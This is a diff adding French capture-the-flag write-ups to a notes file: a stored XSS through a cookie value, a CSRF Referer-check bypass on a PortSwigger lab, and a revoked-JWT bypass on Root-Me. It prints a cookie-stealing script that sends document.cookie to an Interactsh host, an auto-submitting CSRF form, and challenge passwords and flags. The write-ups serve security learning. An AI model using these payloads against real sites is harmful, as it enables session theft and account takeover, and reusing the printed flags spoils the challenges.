@@ -429,7 +429,6 @@ PortSwigger recommande donc :
 
 - **PortSwigger – Preventing **CSRF** vulnerabilities**  
   [https://portswigger.net/web-security/csrf/preventing](https://portswigger.net/web-security/csrf/preventing)
-
   
 
 # Challenge 7 --- SQL Injection Error-Based
@@ -937,8 +936,205 @@ if user.status != 'admin':
 - Ne jamais permettre de modifier un champ sensible (status, role, isAdmin) via une API publique.
 
 
+  # Challenge 9–  XSS - Stockée 2
+  ## Analyse initiale du site
+  En arrivant sur le forum, j’ai d’abord testé le fonctionnement normal en soumettant un message simple :
+   -Titre : test
+   -Message : test
+  <img width="1020" height="275" alt="Capture1" src="https://github.com/user-attachments/assets/dddd4104-b388-4e97-aaa2-075859895dcf" />
 
+  ## Observation de la requête avec Burp
+  En envoyant un message, j’intercepte via Burp une requête :
+  <img width="507" height="440" alt="Capture2" src="https://github.com/user-attachments/assets/c36d4a67-c932-4cc2-85cc-829bf3c85ee1" />
 
-
-
+  ```
+  POST /web-client/ch19/ HTTP/1.1
+  Content-Type: application/x-www-form-urlencoded
+  Cookie: status=invite
+  ```
   
+Je remarque un élément intéressant :
+👉 Le cookie status semble indiquer si l’utilisateur est invite ou admin.
+👉 Il est potentiellement réinjecté dans la page sans filtrage, ce qui suggère une possible vulnérabilité XSS
+
+  ## Hypothèse : XSS via la valeur du cookie
+
+Si la valeur du cookie status est affichée directement dans le HTML, alors en modifiant cette valeur pour y insérer du JavaScript, le script pourra être exécuté dans le navigateur…
+Et surtout, dans le navigateur de l’administrateur, lorsqu’il affichera la page.
+
+C’est une XSS stockée via cookie injection.
+ ## Construction du payload XSS
+J’utilise Interactsh pour récupérer les cookies volés (serveur d’exfiltration).
+https://app.interactsh.com/#/
+Je mets mon identifiant Interactsh dans un payload JavaScript :
+ ```
+<script>
+document.location.href="https://MON_ID_INTERACTSH.oast.fun/?c="+document.cookie
+</script>
+ ```
+Ensuite, j’injecte ce payload dans la valeur du cookie status dans Burp Repeater :
+<img width="1042" height="532" alt="Capture3" src="https://github.com/user-attachments/assets/a81e67e0-fb30-4a65-bb3c-0c24f270fd2a" />
+
+ ```
+Cookie: status=aaaa"><script>document.location.href="https://MON_ID_INTERACTSH.oast.fun/?c="+document.cookie</script>;
+ 
+ ```
+Puis j’envoie la requête modifiée.
+## Déclenchement de l’attaque
+
+Quand l’administrateur visite la page du forum :
+-le site réinjecte status dans le HTML,
+-mon JavaScript est exécuté dans son navigateur,
+-son cookie de session est envoyé sur mon serveur Interactsh.
+
+Dans Interactsh, je vois une requête contenant :
+```
+?c=PHPSESSID=XXXXXXXXXXXX
+```
+<img width="1340" height="521" alt="Capture5" src="https://github.com/user-attachments/assets/58e7d803-6bba-42bb-b299-7fd283da6b55" />
+
+🎉 Je possède maintenant le cookie admin.
+## Usurpation de la session administrateur
+
+Dans mon navigateur :
+<img width="1330" height="240" alt="Capture6" src="https://github.com/user-attachments/assets/16791a40-f263-46c9-b074-4002f755678e" />
+
+-Je vais dans Storage / Cookies.
+-Je remplace ma valeur PHPSESSID par celle volée.
+-Je recharge la page.
+
+Je suis maintenant authentifiée comme admin.
+## Accès à la section d’administration
+
+En me rendant sur ?section=admin, le site m’affiche :
+```
+Vous pouvez valider ce challenge avec ce mot de passe :
+E5HKEGyCXQVsYaehaqeJs0AfV
+```
+
+👉 C’est la solution du challenge.
+# Challenge 5:CSRF where Referer validation depends on header being present
+## Analyse du fonctionnement normal
+Après connexion avec :
+```
+username: wiener  
+password: peter
+```
+je teste  le changement d’email 
+<img width="1052" height="415" alt="5-2Capture" src="https://github.com/user-attachments/assets/1b892376-2909-4193-8630-6599101e0145" />
+
+Burp Suite intercepte la requête :
+
+## Test du filtre CSRF via Burp Repeater
+test:supprimer complètement le header Referer
+Je supprime la ligne :Referer: ...
+Résultat : Requête acceptée
+➡️ Le serveur n’oblige PAS la présence du Referer.
+➡️ C’est la faille : un Referer absent permet de bypass le contrôle CSRF.
+3. Contournement : suppression automatique du Referer
+
+Le navigateur envoie automatiquement un header Referer lors des requêtes POST cross-origin.
+
+Pour le supprimer, on utilise :
+```
+<meta name="referrer" content="no-referrer">
+```
+
+Cette balise force le navigateur à NE PAS envoyer de Referer, ce qui permet de contourner la protection CSRF.
+4. Construction du payload CSRF
+
+Sur l’exploit server du lab, j’héberge la page suivante :
+```
+<html>
+<head>
+  <meta name="referrer" content="no-referrer">
+</head>
+<body>
+  <h1>CSRF exploit</h1>
+  <form action="https://0a91008f049689fe827f066f008d0000.web-security-academy.net/my-account/change-email" method="POST" id="csrfForm">
+    <input type="hidden" name="email" value="owned@evil.com">
+  </form>
+
+  <script>
+    document.getElementById("csrfForm").submit();
+  </script>
+</body>
+</html>
+```
+🔍 Pourquoi ça marche ?
+
+Le formulaire envoie une requête POST automatiquement.
+
+Grâce à la balise <meta name="referrer" content="no-referrer">,
+le navigateur supprime totalement le header Referer.
+
+Le serveur accepte la requête sans Referer.
+
+L’email de la victime est changé en : owned@evil.com.
+## Validation du challenge
+
+Depuis l’exploit server :
+
+Je clique sur Store pour sauvegarder l’exploit.
+
+Puis sur Deliver to victim.
+
+Le serveur victime charge mon exploit → requête POST sans Referer → email modifié.
+
+🎉 Challenge résolu.
+
+
+## Challenge 6 – JWT Révoqué
+Exploitation
+Étape 1 — Login pour obtenir un token
+
+Requête :
+```
+POST /web-serveur/ch63/login HTTP/1.1
+Host: challenge01.root-me.org
+Content-Type: application/json
+
+{"username":"admin","password":"admin"}
+```
+<img width="1107" height="504" alt="6-1Capture" src="https://github.com/user-attachments/assets/b66c0aa1-e830-4da7-af03-bcfda4709372" />
+
+
+Réponse  :
+
+{
+  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...."
+}
+
+
+➡️ Copier ce token.
+Étape 2 — Modifier le token pour contourner la blacklist
+
+Il suffit d'ajouter un = à la fin :
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9....=
+
+
+Ce token :
+
+n'est plus dans la blacklist
+
+mais reste valide pour la librairie JWT utilisée
+
+Étape 3 — Appel de /admin avec le token modifié
+```
+GET /web-serveur/ch63/admin HTTP/1.1
+Host: challenge01.root-me.org
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9....=
+```
+<img width="1020" height="444" alt="6-2Capture" src="https://github.com/user-attachments/assets/2a0f6466-e0e9-42a5-977d-354c83aab035" />
+
+🏁 4. Résultat
+
+Le serveur renvoie :
+
+{
+  "Congratzzzz!!!_flag:": "Do_n0t_r3v0k3_3nc0d3dT0k3nz_M4am3ne-U53_th3_JTI_field"
+}
+
+
+➡️ Challenge validé.
